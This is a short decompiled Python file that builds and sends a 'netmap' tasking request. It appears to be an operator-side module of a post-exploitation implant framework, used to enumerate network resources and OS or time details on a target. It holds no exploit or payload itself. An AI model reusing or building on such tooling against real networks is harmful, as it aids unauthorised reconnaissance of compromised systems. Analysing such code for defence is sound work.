# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: Mcl_Cmd_Netmap_Tasking.py
NETMAP_TYPE_ALL = 0
NETMAP_TYPE_CONNECTED = 1
NETMAP_TYPE_REMEMBERED = 2

def TaskingMain(namespace):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    from mcl.object.Message import MarshalMessage
    mcl.imports.ImportWithNamespace(namespace, 'mca.network.cmd.netmap', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mca.network.cmd.netmap.tasking', globals())
    lpParams = mcl.tasking.GetParameters()
    tgtParams = mca.network.cmd.netmap.Params()
    if lpParams['type'] == NETMAP_TYPE_ALL:
        tgtParams.scope = mca.network.cmd.netmap.NETMAP_SCOPE_ALL
    elif lpParams['type'] == NETMAP_TYPE_CONNECTED:
        tgtParams.scope = mca.network.cmd.netmap.NETMAP_SCOPE_CONNECTED
    elif lpParams['type'] == NETMAP_TYPE_REMEMBERED:
        tgtParams.scope = mca.network.cmd.netmap.NETMAP_SCOPE_REMEMBERED
    else:
        mcl.tasking.OutputError('Invalid type (%u)' % lpParams['type'])
        return False
    if lpParams['getOsInfo']:
        tgtParams.flags |= mca.network.cmd.netmap.PARAMS_FLAG_GET_OS_INFO
    if lpParams['getTimeInfo']:
        tgtParams.flags |= mca.network.cmd.netmap.PARAMS_FLAG_GET_TIME
    rpc = mca.network.cmd.netmap.tasking.RPC_INFO_QUERY
    msg = MarshalMessage()
    tgtParams.Marshal(msg)
    rpc.SetData(msg.Serialize())
    rpc.SetMessagingType('message')
    res = mcl.tasking.RpcPerformCall(rpc)
    if res != mcl.target.CALL_SUCCEEDED:
        mcl.tasking.RecordModuleError(res, 0, mca.network.cmd.netmap.errorStrings)
        return False
    return True


if __name__ == '__main__':
    import sys
    if TaskingMain(sys.argv[1]) != True:
        sys.exit(-1)